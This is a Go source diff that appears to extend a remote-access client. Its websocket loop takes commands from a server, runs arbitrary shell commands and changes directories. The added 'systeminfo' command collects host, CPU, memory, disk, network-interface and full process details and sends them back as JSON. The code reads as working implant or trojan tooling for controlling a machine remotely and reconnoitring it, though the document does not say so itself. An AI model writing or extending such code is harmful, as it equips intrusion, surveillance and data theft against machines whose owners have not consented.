@@ -4,8 +4,14 @@ package main
 import (
 	"fmt"
 	"github.com/gorilla/websocket"
+
 	"github.com/shirou/gopsutil/v3/cpu"
+	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/host"
+	"github.com/shirou/gopsutil/v3/mem"
+	"github.com/shirou/gopsutil/v3/net"
+	"github.com/shirou/gopsutil/v3/process"
+
 	"strings"
 	"crypto/tls"
 	"time"
@@ -21,6 +27,84 @@ const (
 
 type ExecuteCommand struct {
 	conn *websocket.Conn
+}
+
+// 获取系统信息
+func (e *ExecuteCommand) get_systeminfo() map[string]interface{} {
+    system_info := make(map[string]interface{})
+    
+    // 获取主机信息
+    if host_info, err := host.Info(); err != nil {
+        system_info["host"] = "error: " + err.Error()
+    } else {
+        system_info["host"] = host_info
+    }
+
+    // 获取CPU信息
+    if cpu_info, err := cpu.Info(); err != nil {
+        system_info["cpu"] = "error: " + err.Error()
+    } else {
+        system_info["cpu"] = cpu_info
+    }
+
+    // 获取内存信息
+    if mem_info, err := mem.VirtualMemory(); err != nil {
+        system_info["memory"] = "error: " + err.Error()
+    } else {
+        system_info["memory"] = mem_info
+    }
+
+    // 获取交换内存信息
+    if smem_info, err := mem.SwapMemory(); err != nil {
+        system_info["swap_memory"] = "error: " + err.Error()
+    } else {
+        system_info["swap_memory"] = smem_info
+    }
+
+    // 获取磁盘分区信息
+    if partition_info, err := disk.Partitions(true); err != nil {
+        system_info["partition"] = "error: " + err.Error()
+    } else {
+        system_info["partition"] = partition_info
+        // 获取磁盘使用情况
+        if len(partition_info) > 0 {
+            if usage_info, err := disk.Usage(partition_info[0].Mountpoint); err != nil {
+                system_info["disk_usage"] = "error: " + err.Error()
+            } else {
+                system_info["disk_usage"] = usage_info
+            }
+        }
+    }
+
+    // 获取磁盘IO信息
+    if io_info, err := disk.IOCounters(); err != nil {
+        system_info["io_disk"] = "error: " + err.Error()
+    } else {
+        system_info["io_disk"] = io_info
+    }
+
+    // 获取网络接口信息
+    if interfaces_info, err := net.Interfaces(); err != nil {
+        system_info["interfaces"] = "error: " + err.Error()
+    } else {
+        system_info["interfaces"] = interfaces_info
+    }
+
+    // 获取网络IO信息
+    if io_net_info, err := net.IOCounters(true); err != nil {
+        system_info["io_network"] = "error: " + err.Error()
+    } else {
+        system_info["io_network"] = io_net_info
+    }
+
+    // 获取进程信息
+    if processes_info, err := process.Processes(); err != nil {
+        system_info["processes"] = "error: " + err.Error()
+    } else {
+        system_info["processes"] = processes_info
+    }
+
+    return system_info
 }
 
 // 执行命令并返回结果
@@ -75,6 +159,7 @@ func (e *ExecuteCommand) change_directory(directory string) string {
 	}
 	return "Directory changed successfully"
 }
+
 
 // 获取系统信息
 func get_system_info() string {
@@ -142,6 +227,13 @@ func client_loop() {
 				// 退出命令
 				conn.Close()
 				return
+			} else if command == "systeminfo" {
+				// 获取系统信息
+				system_info := Executecommand.get_systeminfo()
+				if err := conn.WriteJSON(system_info); err != nil {
+					conn.Close()
+					break
+				}
 			} else if strings.HasPrefix(command, "command:") {
 				// 执行命令
 				command = command[len("command:"):]
